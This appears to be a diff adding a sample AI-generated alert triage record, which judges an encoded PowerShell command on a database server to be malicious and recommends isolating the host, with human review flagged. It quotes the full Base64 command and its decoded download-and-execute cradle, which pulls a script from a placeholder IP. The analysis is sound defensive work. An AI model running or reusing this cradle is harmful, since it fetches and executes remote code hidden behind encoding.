@@ -1,0 +1,43 @@
+{
+  "severity": "Critical",
+  "classification": "true_positive",
+  "confidence": "high",
+  "summary": "Encoded PowerShell on srv-sql-01 running as SYSTEM decodes to a download cradle: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1'). It fetches and runs a remote script from a bare IP address, which is typical staged malware delivery. The host is a database server, so the potential impact is high.",
+  "evidence": [
+    {
+      "field": "command_line",
+      "value": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
+      "why": "The Base64 payload decodes to IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1'). That is a fileless download-and-execute cradle pulling a 'stage' script from a raw IP. The encoding hides the intent, which points to malicious activity."
+    },
+    {
+      "field": "user",
+      "value": "SYSTEM",
+      "why": "Running as SYSTEM means the code has the highest local privileges. It could be benign if a management agent or scheduled task launched it, but no legitimate tool is known to use an encoded IEX download cradle from a raw IP. This raises the risk rather than excusing it."
+    },
+    {
+      "field": "host",
+      "value": "srv-sql-01",
+      "why": "This is a production database server, which would rarely download scripts from the internet. Compromise here could expose sensitive data and allow lateral movement."
+    },
+    {
+      "field": "process",
+      "value": "powershell.exe",
+      "why": "PowerShell is a legitimate admin tool and could be benign in isolation. Combined with the encoded command and remote download, it indicates living-off-the-land abuse."
+    }
+  ],
+  "recommended_action": {
+    "type": "isolate_host",
+    "detail": "Analyst to confirm, then isolate srv-sql-01 via EDR. Block 203.0.113.45 at the proxy and firewall. Check for the parent process and how SYSTEM execution was achieved. Retrieve stage.ps1 if possible. Review the host for persistence, new accounts, and outbound connections. Check whether other hosts contacted 203.0.113.45. Escalate to incident response and consider credential resets for accounts used on this server."
+  },
+  "needs_human_review": true,
+  "review_reasons": [
+    "Severity is Critical",
+    "Recommended action isolates a host"
+  ],
+  "meta": {
+    "provider": "claude",
+    "model": "claude-sonnet-5-5",
+    "prompt_version": "triage-v1",
+    "source": "fallback"
+  }
+}
